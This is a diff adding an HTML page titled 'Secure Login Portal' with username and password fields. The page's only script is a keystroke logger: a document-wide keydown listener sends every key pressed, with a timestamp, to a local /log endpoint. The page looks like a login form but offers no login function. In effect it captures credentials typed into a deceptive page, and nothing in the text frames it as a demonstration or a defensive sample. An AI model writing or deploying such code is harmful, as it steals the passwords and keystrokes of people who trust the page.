@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Secure Login Portal</title>
+  <style>
+    body {
+      font-family: Arial;
+      background: #f4f6f8;
+      display: flex;
+      height: 100vh;
+      justify-content: center;
+      align-items: center;
+    }
+    .card {
+      background: white;
+      padding: 30px;
+      width: 300px;
+      box-shadow: 0 0 10px rgba(0,0,0,.1);
+    }
+    input {
+      width: 100%;
+      margin: 10px 0;
+      padding: 8px;
+    }
+    small {
+      color: red;
+    }
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <h2>Login</h2>
+
+
+  <input type="text" id="username" placeholder="Username">
+  <input type="password" id="password" placeholder="Password">
+</div>
+
+<script>
+document.addEventListener("keydown", function(e) {
+  fetch("http://localhost:3000/log", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      key: e.key,
+      time: new Date().toISOString()
+    })
+  });
+});
+</script>
+
+</body>
+</html>
